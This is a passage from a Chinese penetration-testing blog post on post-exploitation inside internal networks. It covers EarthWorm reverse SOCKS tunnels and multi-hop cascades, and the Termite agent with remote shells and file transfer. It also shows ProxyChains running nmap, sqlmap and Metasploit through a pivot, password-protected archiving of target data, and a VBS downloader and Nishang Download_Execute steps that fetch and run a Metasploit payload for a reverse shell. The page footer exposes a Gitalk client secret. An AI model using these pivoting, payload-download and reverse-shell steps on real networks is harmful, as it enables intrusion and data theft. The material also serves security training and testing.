+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>反弹SOCKS 5 服务器</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 目标机器没有公网IP地址的情况 / 或者在内网内部用</span>
+<span class="token comment" spellcheck="true">#1.先把ew上传到公网vps中，并执行</span>
+ew -s rcsocks -l 1008 -e 888    <span class="token comment" spellcheck="true"># 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端</span>
+
+<span class="token comment" spellcheck="true">#2.然后把ew上传到web服务器(内网)，并执行</span>
+ew -s rssocks -d <span class="token operator">&lt;</span>公网vps_IP<span class="token operator">></span> -e 888
+
+<span class="token comment" spellcheck="true">#3.然后用SocksCap64等添加代理地址为vps的ip:1008</span>
+<span class="token comment" spellcheck="true">#4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>多级级联：<br>Case1. lcx_tran</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网</span>
+<span class="token comment" spellcheck="true"># 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器</span>
+
+<span class="token comment" spellcheck="true"># 1.在DB服务器</span>
+ew -s ssocksd -l 9999
+<span class="token comment" spellcheck="true"># 2.在vps </span>
+ew -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999
+
+<span class="token comment" spellcheck="true"># 3.使用工具连接vps1008即可</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Case2. lcx_listen, lcx_slave</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1. vps</span>
+ew -s lcx_listen -l 1080 -e 8888
+<span class="token comment" spellcheck="true">#2. DB内网主机</span>
+ew -s ssocksd -l 9999
+<span class="token comment" spellcheck="true">#3. 另一台内网主机</span>
+ew -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999
+<span class="token comment" spellcheck="true">#4. 最后连接vps的1080端口</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>三级级联</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1. vps(192.168.0.103)</span>
+ew -s lcx_listen -l 1001 -e 113
+
+<span class="token comment" spellcheck="true">#2.A</span>
+ew -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123
+
+<span class="token comment" spellcheck="true">#3. B(1.1.1.10)</span>
+ew -s lcx_listen -l 123 -e 133
+
+<span class="token comment" spellcheck="true">#4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口</span>
+ew -s rssocks -d 1.1.1.10  -e 133
+
+<span class="token comment" spellcheck="true">#5. 使用代理工具连接vps的1001</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>2.Termite</strong></p>
+<p>分为两部分：<code>admin_exe</code>和<code>agent_exe</code>被控者    </p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Usage</span>
+
+1. 以服务模式启动一个agent服务。
+
+<span class="token operator">></span> $ ./agent -l 8888
+
+2. 令管理端连接到agent并对agent进行管理。
+
+<span class="token operator">></span> $ ./admin -c 127.0.0.1 -p 8888
+
+3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。
+
+<span class="token operator">>></span> <span class="token function">help</span>
+
+4. 通过show指令可以得到当前agent的拓扑情况。
+
+<span class="token operator">>></span> show 
+ 0M
+ +-- 1M
+ 由于当前拓扑中只有一个agent，所以展示结果只有 1M ,
+  其中1 为节点的ID号，
+  M为MacOS系统的简写，Linux为L，Windows简写为W。
+
+5. 将新agent加入当前拓扑
+<span class="token operator">></span> ./agent -c 127.0.0.1 -p 8888
+
+6. 此时show指令将得到如下效果
+ 0M
+ +-- 1M
+ <span class="token operator">|</span>   +-- 2M
+  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。
+
+7. 在2节点开启socks代理，并绑定在本地端口
+<span class="token operator">>></span> goto 2
+    将当前被管理节点切换为 2 号节点。
+<span class="token operator">>></span> socks 1080
+   此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。
+
+8. 在1号节点开启一个shell并绑定到本地端口
+<span class="token operator">>></span> goto 1
+<span class="token operator">>></span> shell 7777
+     此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.
+
+9. 将远程的文件下载至本地
+<span class="token operator">>></span> goto 1
+<span class="token operator">>></span> downfile 1.txt 2.txt
+    将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt
+
+10. 上传文件至远程节点
+<span class="token operator">>></span> goto 2
+<span class="token operator">>></span> upfile 2.txt 3.txt
+    将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt
+
+11. 端口转接
+<span class="token operator">>></span> goto 2 
+<span class="token operator">>></span> lcxtran 3388 10.0.0.1 3389
+    以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口
+
+
+<span class="token comment" spellcheck="true"># 更多支持</span>
+    http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4
+    http://rootkiter.com/toolvideo/toolmp4/2socks.mp4
+    http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4
+    http://rootkiter.com/toolvideo/toolmp4/4shell.mp4
+    http://rootkiter.com/toolvideo/toolmp4/5file.mp4
+
+<span class="token comment" spellcheck="true"># 联系作者</span>
+    rootkiter@rootkiter.com
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>3. 在Windows下使用SocksCap64实现内网漫游</strong><br>代理服务器先设置：<code>ew -s lcx_listen -l 10800 -e 888</code></p>
+<p>以管理员权限打开<br>1.点击<code>代理</code>，添加一个代理(代理服务器的ip和端口)<br>2.点击闪电图标，测试代理服务器是否正常<br>3.选择浏览器，右键，选择<code>在代理隧道中运行选择程序</code>，然后就可以自由访问内网了</p>
+<p><strong>4. 在Linux下使用ProxyChains实现内网漫游</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># kali中安装了ProxyChains，只需配置即可</span>
+<span class="token comment" spellcheck="true"># vim /etc/proxychains.conf</span>
+取消 dynamic_chain 的注释
+修改 socks 127.0.0.1 1080 为自己的端口
+
+<span class="token comment" spellcheck="true"># 测试是否正常</span>
+proxyresolv www.baidu.com    
+<span class="token comment" spellcheck="true"># 如提示没找到命令</span>
+<span class="token function">cp</span> /usr/lib/proxychains3/proxyresolv /use/bin/
+
+<span class="token comment" spellcheck="true"># 启动火狐浏览器(使用socks代理)</span>
+proxychains firefox        <span class="token comment" spellcheck="true"># 可以访问到内网的站点</span>
+
+<span class="token comment" spellcheck="true"># 同样nmap，sqlmap，msf都可以以代理方式运行</span>
+proxychains nmap 192.168.0.1/24
+proxychains sqlmap -u 192.168.0.12
+proxychains msfconsole
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据 "></a><font color="red">压缩数据 </font></h2><h4 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1. RAR"></a>1. RAR</h4><p>如果目标安装了<code>win.rar</code>，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把<code>win.exe</code>拿出来</p>
+<p>参数:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">a    添加要压缩的文件
+-k    锁定压缩文件
+-s    生成存档文件<span class="token punctuation">(</span>提高压缩比<span class="token punctuation">)</span>
+-p    指定压缩密码
+-r    递归压缩
+-x    指定要排除的文件
+-v    分卷打包<span class="token punctuation">(</span>大文件时候用处很大<span class="token punctuation">)</span>
+-ep    从名称中排除路径
+-ep1    从名称中排除基本目录
+-m0     存储，添加到压缩文件时不压缩
+-m1    最快，使用最快压缩方式<span class="token punctuation">(</span>低压缩比<span class="token punctuation">)</span>
+-m2    较快，使用快速压缩方式
+-m3    标准，使用标准压缩方式<span class="token punctuation">(</span>默认<span class="token punctuation">)</span>
+-m4    较好，使用较强压缩方式<span class="token punctuation">(</span>速度较慢<span class="token punctuation">)</span>
+-m5    最好，使用最强压缩方式<span class="token punctuation">(</span>最好的压缩方式，但速度最慢<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>以RAR格式压缩/解压</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 压缩</span>
+rar.exe a -k -r -s -m3 C:\\1.rar C:\\apps
+
+<span class="token comment" spellcheck="true"># 解压</span>
+rar.exe e  C:\\1.rar
+
+<span class="token comment" spellcheck="true"># </span>
+-e    <span class="token comment" spellcheck="true"># 解压到当前根目录下</span>
+-x    <span class="token comment" spellcheck="true"># 以绝对路径解压</span>
+
+<span class="token comment" spellcheck="true"># zip和rar一样，修改后缀即可</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>分卷压缩/解压</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 压缩(每个卷的大小为20MB)</span>
+rar.exe a -m0 -r -v20m  C:\\1.rar C:\\apps
+
+<span class="token comment" spellcheck="true"># 解压</span>
+rar.exe x  C:\\1.part01.rar C:\\apps
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="2-7-Zip"><a href="#2-7-Zip" class="headerlink" title="2. 7-Zip"></a>2. 7-Zip</h4><p>下载地址：<a href="https://www.7-zip.org/" target="_blank" rel="noopener">https://www.7-zip.org/</a><br>参数：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">-r    递归压缩
+-o    指定输出目录
+-p    指定密码
+-v    分卷压缩
+a    添加压缩文件
+x    解压
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>普通压缩/解压方式</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 压缩</span>
+7z.exe a -r -p123456 C:\apps\1.7z C:\apps
+
+
+<span class="token comment" spellcheck="true"># 解压</span>
+7z.exe x -p123456 C:\apps\1.7z -o C:\apps2
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>分卷压缩/解压方式</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 压缩（每个分卷20MB）</span>
+7z.exe a -r -vlm -p123456 C:\apps\1.7z C:\apps
+
+
+<span class="token comment" spellcheck="true"># 解压</span>
+7z.exe x -p123456 C:\apps\1.7z.001 -o C:\apps2
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="上传和下载"><a href="#上传和下载" class="headerlink" title=" 上传和下载"></a><font color="red"> 上传和下载</font></h2><blockquote>
+<p>对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作</p>
+</blockquote>
+<h4 id="1-利用FTP上传文件"><a href="#1-利用FTP上传文件" class="headerlink" title="1.利用FTP上传文件"></a>1.利用FTP上传文件</h4><p>在本地或vps搭建FTP服务器</p>
+<p>常用FTP命令</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">open</span> 192.168.0.10    <span class="token comment" spellcheck="true"># 连接服务器</span>
+<span class="token function">cd</span> <span class="token operator">&lt;</span>目录<span class="token operator">></span>
+lcd <span class="token operator">&lt;</span>文件夹路径<span class="token operator">></span>    <span class="token comment" spellcheck="true"># 定位本地文件夹(上传文件的位置或者下载文件的保存位置)</span>
+<span class="token function">type</span>    <span class="token comment" spellcheck="true"># 查看的当前的传输方式(默认是ASCII码传输)</span>
+ascii    <span class="token comment" spellcheck="true"># 设置传输方式为ascii（传输txt等）</span>
+binary    <span class="token comment" spellcheck="true"># 设置传输方式为二进制传输（传输exe图片视频声音等）</span>
+close        <span class="token comment" spellcheck="true"># 结束与服务器的FTP对话</span>
+quit    <span class="token comment" spellcheck="true"># 结束与服务器的FTP对话并推出FTP环境</span>
+put <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
+send <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
+get <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 下载，如果不指定newname，就为原名字</span>
+mget filename <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 下载多个文件。支持空格和"?"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件）</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="2-利用VBS上传文件"><a href="#2-利用VBS上传文件" class="headerlink" title="2. 利用VBS上传文件"></a>2. 利用VBS上传文件</h4><p>主要是是使用<code>msxm12.xmlhttp</code>和<code>adoab.stream</code></p>
+<p>上传</p>
+<pre class="line-numbers language-vbs"><code class="language-vbs">
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>下载</p>
+<pre class="line-numbers language-vba"><code class="language-vba">//把下面的命令以此保存到文件（比如 echo "xxxxxxx" >> download.vbs）
+Set Post = CreateObject("Msxm12.XMLHTTP");
+Set Shell = CreateObject("Wscript.Shell");
+Post.Open "GET","http://xxxx/target.exe"
+Post.Send();
+Set aGet = CreateObject("ADODB.Stream");
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody);
+aGet.SaveToFile "C:\\test\target.exe",2
+
+
+//保存为download.vbs后，然后执行下面的命令
+cscript download.vbs
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="3-利用Debug上传"><a href="#3-利用Debug上传" class="headerlink" title="3. 利用Debug上传"></a>3. 利用Debug上传</h4><p><strong>原理：</strong>将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># exe2bat.exe 只支持&lt;64KB的文件，方法也较古老</span>
+<span class="token comment" spellcheck="true"># kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。</span>
+<span class="token comment" spellcheck="true"># 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式</span>
+wine exe2bat.exe ew.exe ew.txt        <span class="token comment" spellcheck="true"># 这里，测试ew.exe代理工具</span>
+
+<span class="token comment" spellcheck="true"># 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe</span>
+copy 1.dll ew.exe
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="4-利用Nishang上传"><a href="#4-利用Nishang上传" class="headerlink" title="4. 利用Nishang上传"></a>4. 利用Nishang上传</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nishang中的脚本：Download_Execute    --> 常用来下载文本文件并将其转为exe文件</span>
+
+<span class="token comment" spellcheck="true">#1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1</span>
+
+<span class="token comment" spellcheck="true">#2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt</span>
+.\ExetoText c:\msf.exe c:\msf.txt
+
+<span class="token comment" spellcheck="true">#3. 调用Download_Execute来下载并执行该文件</span>
+Download_Execute http://xxxxxx/msf.txt
+
+<span class="token comment" spellcheck="true">#4. 回到msf的监听窗口，可以看到反弹的shell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="5-利用bitsadmin下载"><a href="#5-利用bitsadmin下载" class="headerlink" title="5. 利用bitsadmin下载"></a>5. 利用bitsadmin下载</h4><p>命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展</p>
+<p>如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题<br>Note：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本</p>
+<h4 id="6-利用PowerShell下载"><a href="#6-利用PowerShell下载" class="headerlink" title="6. 利用PowerShell下载"></a>6. 利用PowerShell下载</h4><pre class="line-numbers language-bash"><code class="language-bash">Download<span class="token punctuation">(</span><span class="token punctuation">)</span>
+DownloadString<span class="token punctuation">(</span><span class="token punctuation">)</span>
+。。。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>整理了一天，越整越乱，头都大了，下次理清了再来优化</p>
+</blockquote>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://www.xpshuai.cn" rel="external nofollow noreferrer">浮生</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://www.xpshuai.cn/posts/35263/">http://www.xpshuai.cn/posts/35263/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="http://www.xpshuai.cn" target="_blank">浮生</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/渗透测试/">
+                                    <span class="chip bg-color">渗透测试</span>
+                                </a>
+                            
+                                <a href="/tags/内网/">
+                                    <span class="chip bg-color">内网</span>
+                                </a>
+                            
+                                <a href="/tags/隧道技术/">
+                                    <span class="chip bg-color">隧道技术</span>
+                                </a>
+                            
+                                <a href="/tags/端口转发/">
+                                    <span class="chip bg-color">端口转发</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'd75ec1a5864747376f6f',
+        clientSecret: 'b4751152ca815e8e538c64da23e2a371fa1fb2db',
+        repo: 'https://github.com/shuai06/gittalks.git',
+        owner: 'SHUAI06',
+        admin: "shuai06",
+        id: '2020-05-16T21-47-03',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/19808/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="ubuntu server-安全相关设置">
+                        
+                        <span class="card-title">ubuntu server-安全相关设置</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            142-安全设置Linux默认安装已经很安全，当很多的了解安全仍非常必要打造一个相当安全的系统（增加入侵者的成本，安全也是要考虑成本的）
+大部分的安全事件来自于内部员工和已经离职的员工
+
+防护思路
+风险评估：攻击面
+制定策略：最小化、明确需
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Linux/" class="post-category">
+                                    Linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ubuntu/">
+                        <span class="chip bg-color">ubuntu</span>
+                    </a>
+                    
+                    <a href="/tags/UFW/">
+                        <span class="chip bg-color">UFW</span>
+                    </a>
+                    
+                    <a href="/tags/文件加密/">
+                        <span class="chip bg-color">文件加密</span>
+                    </a>
+                    
+                    <a href="/tags/AppArmor/">
+                        <span class="chip bg-color">AppArmor</span>
+                    </a>
+                    
+                    <a href="/tags/ClamAV/">
+                        <span class="chip bg-color">ClamAV</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/55264/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Linux安全加固(初级)">
+                        
+                        <span class="card-title">Linux安全加固(初级)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Linux安全加固一、安装和升级使用custom自定义安装,不必要的软件包尽量不装,如有必要给lilo/grub引导器加入口令限制, 安装完成后使用up2date或是apt(Debian)升级系统软件, 有时升级内核也是必要的。编辑 /et
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Linux/" class="post-category">
+                                    Linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/安全加固/">
+                        <span class="chip bg-color">安全加固</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
